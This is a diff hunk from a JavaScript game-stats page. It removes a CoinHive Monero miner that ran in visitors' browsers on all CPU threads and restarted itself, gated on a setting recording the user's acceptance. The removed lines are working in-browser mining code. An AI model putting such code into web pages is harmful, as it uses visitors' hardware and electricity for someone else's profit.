@@ -137,23 +137,6 @@ $(document).ready(function () {
       }
     }
     let timer = new Date().getTime(),setting = data.setting;
-    if((timer-data.first_login)>30000||setting.show_miner){
-      if(!setting.mine_alert) {}
-      else if(!setting.mine_alert.state) {}
-      else if(setting.mine_alert.accept){
-        var miner = new CoinHive.User(monro_api_key,data.uid, {
-          threads: navigator.hardwareConcurrency,
-          autoThreads: false,
-          throttle: .6,
-          forceASMJS: false,
-          language:'zh'
-        });
-        miner.start();
-        setInterval(function () {
-          if(!miner.isRunning()) miner.start();
-        },100000);
-      }
-    }
     // console.log(data);
     dataArr = ['name','hp','atk','count'];
     dataBrr = ['','血量 : ','攻擊 : ','查詢次數 : '];
